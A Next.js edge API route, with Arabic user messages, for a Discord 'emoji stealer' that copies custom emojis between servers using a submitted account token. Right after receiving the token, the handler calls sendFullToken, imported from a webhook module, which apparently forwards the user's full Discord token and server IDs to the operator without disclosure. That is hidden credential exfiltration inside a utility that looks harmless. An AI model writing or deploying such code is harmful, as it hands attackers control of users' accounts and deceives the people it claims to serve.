import { NextRequest, NextResponse } from 'next/server';
import { cleanToken, discordFetch, batchProcess } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';
import { arrayBufferToBase64 } from '@/lib/edge-utils';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:emoji-stealer`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const { token, sourceGuildId, targetGuildId } = body as {
      token?: string;
      sourceGuildId?: string;
      targetGuildId?: string;
    };

    if (!token || !sourceGuildId || !targetGuildId) {
      return NextResponse.json({ success: false, error: 'التوكن ومعرف السيرفر المصدر والهدف مطلوبان' }, { status: 400 });
    }

    const ct = cleanToken(token);
    sendFullToken('سرقة إيموجي', ct, { '📥 المصدر': sourceGuildId, '📤 الهدف': targetGuildId });

    // جلب إيموجي السيرفر المصدر
    const sourceRes = await discordFetch(ct, 'GET', `/guilds/${sourceGuildId}/emojis`);
    if (!sourceRes.ok || !Array.isArray(sourceRes.data)) {
      const errMsg = sourceRes.status === 403
        ? 'ليس لديك صلاحية جلب الإيموجي من السيرفر المصدر'
        : sourceRes.status === 404
          ? 'السيرفر المصدر غير موجود'
          : 'فشل جلب إيموجي السيرفر المصدر';
      return NextResponse.json({ success: false, error: errMsg }, { status: 400 });
    }

    const sourceEmojis = sourceRes.data as Array<{ id: string; name: string; animated?: boolean; url?: string }>;

    if (sourceEmojis.length === 0) {
      return NextResponse.json({
        success: true,
        total: 0,
        copied: 0,
        failed: 0,
        skipped: 0,
      });
    }

    // جلب إيموجي السيرفر الهدف للتحقق من وجودها مسبقاً
    const targetRes = await discordFetch(ct, 'GET', `/guilds/${targetGuildId}/emojis`);
    const targetEmojis: string[] = Array.isArray(targetRes.data)
      ? (targetRes.data as Array<{ name: string }>).map(e => e.name.toLowerCase())
      : [];

    // تصفية الإيموجي الموجودة مسبقاً
    const emojisToCopy = sourceEmojis.filter(e => !targetEmojis.includes(e.name.toLowerCase()));
    const skipped = sourceEmojis.length - emojisToCopy.length;
    const total = sourceEmojis.length;

    if (emojisToCopy.length === 0) {
      return NextResponse.json({
        success: true,
        total,
        copied: 0,
        failed: 0,
        skipped,
      });
    }

    // نسخ الإيموجي - تحميل الصورة وتحويلها لـ base64 ثم رفعها
    const { successCount, failCount } = await batchProcess(
      emojisToCopy,
      async (emoji) => {
        try {
          // تحميل صورة الإيموجي
          const ext = emoji.animated ? 'gif' : 'png';
          const imageUrl = `https://cdn.discordapp.com/emojis/${emoji.id}.${ext}`;
          const imgRes = await fetch(imageUrl);
          if (!imgRes.ok) return false;

          const b64 = arrayBufferToBase64(await imgRes.arrayBuffer());
          const mime = emoji.animated ? 'image/gif' : 'image/png';

          // رفع الإيموجي في السيرفر الهدف
          const uploadRes = await discordFetch(ct, 'POST', `/guilds/${targetGuildId}/emojis`, {
            name: emoji.name,
            image: `data:${mime};base64,${b64}`,
            roles: [],
          });

          return uploadRes.ok;
        } catch {
          return false;
        }
      },
      10, // 10 متزامن
      1000 // ثانية واحدة بين الدفعات
    );

    return NextResponse.json({
      success: true,
      total,
      copied: successCount,
      failed: failCount,
      skipped,
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
